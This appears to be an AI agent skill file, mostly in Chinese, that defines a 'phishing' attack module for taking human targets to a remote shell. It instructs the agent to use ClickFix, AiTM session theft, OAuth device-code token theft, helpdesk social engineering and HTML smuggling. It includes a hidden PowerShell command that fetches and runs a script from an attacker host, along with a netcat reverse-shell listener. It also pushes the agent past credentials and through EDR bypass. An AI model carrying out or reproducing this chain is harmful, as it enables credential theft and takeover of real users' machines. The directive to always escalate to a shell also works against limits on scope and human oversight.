---
name: phishing
description: "Client-side initial access and social-engineering attack module. Use when the operator selects a human/client/browser/identity-delivery attack direction: ClickFix/FileFix, AiTM session phishing, OAuth device-code or consent abuse, Teams/helpdesk social engineering, HTML/file delivery, QR/mobile handoff, legacy HTA/OLE/Office paths. This is an Attack module: own the chain until host shell or remote interactive foothold. Credential/token/session are intermediate results, not the stop condition. If endpoint AV/EDR/AMSI/application-control blocks an otherwise-valid client execution path, the operator may temporarily select /edr-bypass and then resume this phishing chain until shell."
---

# /phishing — Client-side Initial Access

> **定位：** 针对人 + 浏览器 + IdP + 协作客户端的 **Attack 模块**。和其他 Attack 模块一样，默认把当前链打到 **host shell / remote interactive foothold**。
>
> 不要在“用户点击成功”或“看到 cookie”处结束。身份类路径（AiTM / Device Code / OAuth）先拿到可验证的 token/session，然后在本模块内继续换成执行入口（Intune / RMM / SharePoint / Teams 远程协助 / 再叠 ClickFix），直到 shell。
>
> **EDR 边界：** 邮件网关、Safe Links、URL 扫描、浏览器下载策略、IdP 限制属于本模块。只有 payload 已进入 endpoint execution 且被 AV/EDR/AMSI/WDAC 拦住时，才临时 `/edr-bypass`。解决后回到本链拿 shell。

工具安装见 `../shared/tools.md`。走到对应投递方式再 Read **一份** reference，不要开局把 ClickFix/AiTM/OAuth 全读。发信前验证只在要发出去时 Read `references/campaign-validation.md`。

---

## 开局与收尾

开局第一件事：Read `./notes.md`。没有则 `python ~/.claude/skills/bin/notes.py init`。只按已拿下/凭据继续。
走到哪条链，才 Read **一份** `references/<file>.md`。禁止开局全读、禁止凭记忆写 payload。
监听 / sudo / 输密码 / Permission denied：立刻停，说明等操作者做什么，等回报。不要假装已成功。
收尾：
1. 追加 `./notes.md`
2. `python ~/.claude/skills/bin/modules.py tail <本模块名>`
   Read 备用：`~/.claude/skills/shared/modules.yaml`
   禁止 `./modules.yaml` 和 `python ../bin/...`
3. 优先 `default_next`；`never_default` 不得当作默认（操作者点名除外）
4. 名册外的名字不许建议
5. 停。等操作者选 `/模块` 或 `/clear`
`/edr-bypass` 半条链未完：打通后回本模块，不要 /clear。


---

## 0. 攻击强度

本模块是红队攻击模块。目标是 **Shell**（或等价的 remote interactive 控制）。高影响 payload、反向 shell、token replay、OAuth 持久授权都保留。标前置和清理，由操作者决定是否发出。不要改成“只验证用户是否会点”。

```text
ClickFix / FileFix / HTA / HTML smuggling
        ↓
user-assisted execution
        ↓
callback / reverse shell          ← 本链默认终点

AiTM / Device Code / OAuth
        ↓
verified reusable token/session
        ↓
用该身份找执行入口（本模块继续）
        ↓
shell / remote interactive        ← 仍要走到这里
```

---

## 0.1 先做攻击面决策

确认目标环境，给出 1–3 条 candidate，由操作者选。不自动切模块。

```text
IdP: Entra / ADFS / Okta / Google
MFA: password-only / TOTP / push / passkey / compliant-device
Client: Windows / macOS / browser / PS 可用性 / EDR
Delivery: email / Teams / QR / web lure / helpdesk / file
```

P0（2026）：ClickFix、FileFix、macOS ClickFix、Device Code、AiTM、OAuth Consent、Teams/Quick Assist。

Legacy（环境门控）：VBA / HTA / OLE / OneNote / BITB。

---

## 1. ClickFix / FileFix — 直接打到 shell

详见 `references/clickfix-filefix.md`。

最小链：

```text
lure page 复制命令到剪贴板
→ 用户 Win+R 或 Explorer 地址栏粘贴回车
→ 先 DNS/whoami marker
→ 同一路径换成 reverse shell
```

Windows 反向 shell 模板（替换 KALI/PORT，授权靶场直接用）：

```powershell
powershell -NoP -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString('http://KALI/s.ps1')"
```

`s.ps1` 用 ConPty / 原 shell 模块的稳定 payload。监听：

```bash
rlwrap nc -lvnp 443
# 或 msfconsole multi/handler
```

payload 被 Defender 拦：marker 已证明执行 → 操作者选 `/edr-bypass` → 回来继续 callback。

---

## 2. AiTM / Session phishing

详见 `references/aitm-session.md`。

Evilginx 只是实现。成功不是“抓到 cookie”，是：

```text
1. cookie/token 能打开真实目标应用
2. 用该 session 继续找执行（Intune 脚本、SharePoint 上传、远程协助、再投 ClickFix）
3. 拿到 shell / remote interactive
```

Passkey / token protection / compliant-device 会让 replay 失败，先判断再打。

---

## 3. Device Code / OAuth Consent

详见 `references/device-code-oauth.md`。

```text
实时 device code → 用户在真实 Microsoft 登录页输入
→ 攻击者拿到 access + refresh
→ Graph 验证
→ 用 mailbox / Intune / 协作应用 走到执行
```

TokenTacticsV2 / roadtx 是红队工具，不是犯罪套件。不要用 EvilTokens 这类犯罪 PhaaS。

---

## 4. Teams / Helpdesk / Remote Support

详见 `references/collaboration-helpdesk.md`。

Quick Assist / 合法 RMM 由用户授予后，终点是 **remote interactive access**，等价 shell。继续本模块，不要因为“没用恶意 payload”就停。

---

## 5. Web / File delivery

详见 `references/client-delivery.md`。

HTML smuggling、QR、容器/压缩包。邮件网关绕过留本模块。落地后执行被 EDR 拦 → `/edr-bypass`。

---

## 6. Legacy

详见 `references/legacy-client.md`。老环境仍打到 shell（HTA/VBA/OLE）。不是 2026 默认首选。

---

## 7. 从客户端执行到 Shell

```text
user/client execution
→ marker
→ payload / reverse shell
→ callback
→ /phishing COMPLETE（host shell 或 remote interactive）
```

不要因为已经有 command execution 就强制切 `/shell`。`/shell` 只在 raw session 需要 PTY/ConPTY 时由操作者另选。

```text
client execution works, payload blocked by EDR
→ /edr-bypass
→ return /phishing
→ shell
```

---

## 8. 输出 / 发信前

要发出邮件或 lure 之前 → **只这时** Read `references/campaign-validation.md`（SPF/域名/页一致性）。不要一进模块就读。

```text
[PHISHING]
Vector:
Target control:
Prerequisites:
Current result: marker | token | session | remote interactive | shell
Blocked by: mail gateway / IdP / EDR / none
Next in THIS module:
Optional: /edr-bypass only if endpoint blocks execution
```

完成本链前不要把“用户已点击”写成成功。shell 拿到后写入 `./notes.md`。候选只按「开局与收尾」跑 `python ~/.claude/skills/bin/modules.py tail`。

---

## 9. 不属于本模块

```text
AMSI/syscall/call-stack/kernel     → /edr-bypass
WAF / HTTP parser                  → /web-attack
AD coercion / relay                → /ad-attack
长期 C2 / 主机持久化               → /post
raw shell 稳定化                   → /shell
network pivot                      → /tunnel
```
